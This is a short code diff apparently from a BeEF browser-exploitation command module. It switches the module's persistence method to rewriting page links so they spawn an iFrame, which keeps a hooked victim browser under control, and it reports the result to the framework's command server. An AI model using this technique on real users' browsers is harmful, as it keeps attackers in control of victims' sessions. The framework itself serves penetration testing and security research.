@@ -5,6 +5,6 @@
 //
 
 beef.execute(function() {
-	beef.session.persistent();
+    beef.dom.persistentIframe();
 	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Links have been rewritten to spawn an iFrame.');
 });
